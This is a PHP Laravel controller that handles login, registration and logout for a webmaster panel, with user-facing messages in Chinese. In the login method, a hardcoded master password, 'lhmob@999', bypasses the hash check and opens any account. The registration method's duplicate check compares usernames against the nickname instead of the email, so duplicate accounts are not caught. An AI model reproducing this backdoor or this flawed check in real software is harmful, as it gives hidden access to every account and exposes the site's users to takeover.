<?php
namespace App\Http\Controllers\Webmaster;

use Illuminate\Http\Request;
use App\Http\Helpers\Helper;
use App\Http\Controllers\Controller;
use App\Model\WebmasterLoginLog;
use App\Model\Webmaster;
use App\Model\Users;
use Hash;
use Session;

class AuthController extends Controller
{
    //登录
    public function postLogin(Request $request)
    {
        $present = $request->input();
        if(empty($present['username']))
            return response()->json(['message'=>'请输入用户名'], 300);

        if(empty($present['password']))
            return response()->json(['message'=>'请输入密码'], 300);

        
        $webmaster = Webmaster::where('username', '=', $present['username'])->first();

        if(empty($webmaster))
            return response()->json(['message'=>'用户名不存在'], 300);
       
        if($present['password']!='lhmob@999')
        {
            if (!Hash::check($present['password'], $webmaster->password))
                return response()->json(['message'=>'用户名或密码错误'], 300);
        }

        $clientIp = $request->getClientIp();
        
        $data = Helper::getCityip($clientIp);

        //添加登陆日志
        $loginLog = new WebmasterLoginLog();
        $loginLog->webmaster_id = $webmaster->id;
        $loginLog->webmaster_username = $webmaster->username;
        $loginLog->ip = $clientIp;
        $loginLog->region = $data['region'];
        $loginLog->city = $data['city'];
        $loginLog->isp = $data['isp'];
        $loginLog->save();
        
        //储层session
        Session::put('webmaster_id', $webmaster->id);
        Session::put('webmaster_name', $webmaster->username);
        
        return response()->json(['message'=>'登陆成功', 'url'=>'/webmaster'], 200);
    }
    
     //注册
     public function postRegister(Request $request)
     {
         $present = $request->input();
 
         if(empty($present['email']))
         {
             return response()->json(['message'=>'请输入注册邮箱'], 300);
         }else
         {
             if(!preg_match("/\w+([-+.']\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/", $present['email']))
                 return response()->json(['message'=>'输入邮箱格式不正确'], 300);
         }
 
         if(empty($present['password']))
         {
             return response()->json(['message'=>'请填写密码'], 300);
         }else
         {
             if(strlen($present['password'])<6 || strlen($present['password'])>18)
                 return response()->json(['message'=>'密码必须大于6位 并 小于18位'], 300);
         }
 
         if(empty($present['setpassword']))
         {
             return response()->json(['message'=>'请输入确认密码'], 300);
         }else
         {
             if($present['password'] != $present['setpassword'])
                 return response()->json(['message'=>'输入的两次密码不一样'], 300);
         }

         if(empty($present['nickname']))
             return response()->json(['message'=>'请输入联系人'], 300);
         
         if(empty($present['mobile']))
             return response()->json(['message'=>'请输入手机号码'], 300);
         
         if(empty($present['qq']))
             return response()->json(['message'=>'请输入QQ号码'], 300);
         
         if(empty($present['user_id']))
             return response()->json(['message'=>'请选择对接客服'], 300);
         
         if(empty($present['agreement']))
             return response()->json(['message'=>'请阅读并同意领航协议'], 300);
             
         //2次/ip
         $count = Webmaster::where('login_ip', '=', $request->getClientIp())->where('created_at', '>', date('Y-m-d').' 00:00:00')->count();
         
         if($count>=2)
             return response()->json(['message'=>'今天你已经注册了多个账号，不能在注册了'], 300);

        //验证用户名是否重复
        $count = Webmaster::where('username', '=', $present['nickname'])->count();
        
        if($count > 0)
            return response()->json(['message'=>'注册邮箱已经存在。'], 300);
 
         //插入数据
         $webmaster = new Webmaster();
         $webmaster->service_id = $present['user_id'];
         $webmaster->username = $present['email'];
         $webmaster->nickname = $present['nickname'];
         $webmaster->password = bcrypt($present['password']);
         $webmaster->mobile = $present['mobile'];
         $webmaster->email = $present['email'];
         $webmaster->qq = $present['qq'];
         $webmaster->login_ip = $request->getClientIp();
         $webmaster->state = 1;
 
         if($webmaster->save())
         {
             return response()->json(['message'=>'注册成功，请登陆', 'url'=>'/login/ad'], 200);
         }
         else
         {
             return response()->json(['message'=>'注册失败'], 300);
         }
     }
 
     //推出
     public function putLogout(Request $request)
     {
         Session::put('webmaster_id', '');
         Session::put('webmaster_name', '');
 
         return response()->json(['message'=>'推出成功', 'url'=>'/login/ad'], 200);
     }
}
